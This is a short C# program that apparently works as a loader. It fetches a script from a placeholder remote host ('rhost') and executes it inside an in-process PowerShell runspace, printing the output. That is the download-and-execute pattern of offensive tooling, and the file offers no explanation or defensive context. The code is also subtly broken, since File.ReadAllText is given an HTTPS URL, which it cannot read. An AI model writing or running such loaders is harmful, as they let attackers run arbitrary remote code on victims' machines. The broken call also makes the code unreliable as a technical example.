using System;
using System.IO;
using System.Management.Automation;

class Program
{
    static void Main(string[] args)
    {
        string scriptContent = File.ReadAllText("https://rhost/file.txt");

        using (PowerShell powerShellInstance = PowerShell.Create())
        {
            powerShellInstance.AddScript(scriptContent);
            var output = powerShellInstance.Invoke();

            Console.WriteLine("PowerShell script output:");
            foreach (var item in output)
            {
                Console.WriteLine(item.ToString());
            }
        }
    }
}

